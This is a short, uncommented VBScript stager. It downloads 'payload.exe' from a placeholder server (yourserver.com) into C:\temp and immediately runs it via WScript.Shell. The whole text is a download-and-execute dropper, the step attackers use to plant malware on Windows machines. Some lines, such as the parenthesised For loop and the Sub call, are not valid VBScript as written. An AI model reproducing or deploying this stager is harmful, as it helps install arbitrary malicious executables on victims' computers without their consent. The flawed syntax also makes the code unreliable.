HTTPDownload("http://yourserver.com/files/payload.exe", "C:\temp")

Sub HTTPDownload(myURL, myPath)
    Dim i, objFile, objFSO, strFile, objHTTP, WshShell
    Const ForReading=1, ForWriting=2, ForAppending=8

    Set objFSO = CreateObject("Scripting.FileSystemObject")
    Set WSShell = Wscript.CreateObject("WScript.Shell")
    strFile = objFSO.BuildPath(myPath, Mid(myURL, InStrRev(myURL, "/") + 1))
    Set objFile = objFSO.OpenTextFile(strFile, ForWriting, True)
    Set objHTTP = CreateObject("WinHTTP.WinHTTPRequest.5.1")
    objHTTP.Open("GET", myURL, False)
    objHTTP.Send

    For(i = 1 To LenB(objHTTP.ResponseBody))
        objFile.Write Chr(AscB(MidB(objHTTP.ResponseBody, i, 1)))
        Next
    objFile.Close()
    
    WSShell.Run("C:\temp\payload.exe")
End Sub
